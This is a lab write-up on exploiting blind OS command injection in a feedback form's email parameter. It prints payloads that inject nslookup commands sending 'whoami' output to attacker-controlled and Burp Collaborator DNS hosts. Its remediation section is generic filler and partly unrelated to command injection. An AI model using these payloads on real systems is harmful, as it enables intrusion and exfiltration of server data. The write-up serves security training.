# Blind OS command injection with out-of-band data exfiltration

### Goal - 

Exploit blind OS command injection to issue a DNS lookup to Burp Collaborator


### Vulnerability / Concept

This lab demonstrates a web security vulnerability that can be exploited to compromise the application's security. The vulnerability allows an attacker to bypass security controls and perform unauthorized actions.

The core issue is a failure in the application's security architecture — either insufficient input validation, broken access controls, improper trust boundaries, or insecure handling of user-supplied data. Understanding the root cause is essential for both exploitation and remediation.

### Recon / Initial Analysis

1. Identify the attack surface — what user-controlled inputs exist (URL parameters, form fields, headers, cookies)
2. Analyze the application's behavior with unexpected input
3. Map the request flow and identify trust boundaries
4. Test for error messages that reveal implementation details
5. Compare authenticated vs unauthenticated behavior
6. Use Burp Suite Proxy to capture and analyze all requests
7. Check for hidden parameters using Burp Intruder or Param Miner

### Analysis/Exploitation 

First have a look at the website and its feedback feature. I submit a feedback and send the request to repeater. In the previous lab, we found that the `email` parameter is vulnerable to blind OS command injection:
I assume that the attack vector is the same as in the other labs: the email input field.

try to do **OS command injection** in the `email` parameter:

`;id;#`

However, there’s no output of our command in the response, it might be vulnerable to blind OS command injection.

Therefore I open a new Burp Collaborator client and generate a new payload. URLencode the payload to avoid breaking the request.

```bash
;nslookup 8mvkjln6evqts94q7vwt31eziqoic90y.oastify.com;#
```

we successfully received 2 DNS lookups, which means the feedback function is indeed vulnerable to blind OS command injection!!

Once we’ve confirmed blind OS command injection, we can exfiltrate the output from injected commands using OAST techniques:

{% hint style="info" %}
💡 The out-of-band channel provides an easy way to exfiltrate the output from injected commands:

```bash
& nslookup `whoami`.kgji2ohoyw.web-attacker.com &
```

This causes a DNS lookup to the attacker's domain containing the result of the `whoami` command:

```bash
wwwuser.kgji2ohoyw.web-attacker.com
```

{% endhint %}


Add the output of `whoami` as subdomain to the domain name provided but Burp Collaborator and send the request. URLencode the payload to avoid breaking the request.

```bash
; nslookup `whoami`.8mvkjln6evqts94q7vwt31eziqoic90y.burpcollaborator.net; #
or
; nslookup $(whoami).8mvkjln6evqts94q7vwt31eziqoic90y.burpcollaborator.net; #
```

The username is shown in the DNS request:

### Why It Works

The vulnerability exists because the application fails to properly validate, sanitize, or authorize user input. The broken trust boundary allows an attacker to manipulate the application's behavior by injecting unexpected data that the server processes without adequate security checks.

### Real-World Impact

An attacker could exploit this vulnerability to:
- Access sensitive data belonging to other users
- Bypass authentication or authorization controls
- Perform unauthorized actions on behalf of legitimate users
- Potentially achieve remote code execution on the server
- Compromise the integrity or availability of the application

### Remediation

- Implement proper server-side input validation for all user-controlled data
- Use parameterized queries and prepared statements
- Enforce server-side authorization checks on every request
- Follow the principle of least privilege
- Implement security headers (CSP, X-Frame-Options, X-Content-Type-Options)
- Use a Web Application Firewall (WAF) as defense-in-depth
- Regularly test for vulnerabilities using automated scanners and manual testing

### Key Takeaways

- Never trust user-controlled input — validate and sanitize everything server-side.
- Security controls must be enforced server-side, not client-side.
- Understanding the vulnerability's root cause is essential for proper remediation.
- Burp Suite is essential for identifying and exploiting web vulnerabilities.
- Defense in depth — use multiple layers of protection, not just one.
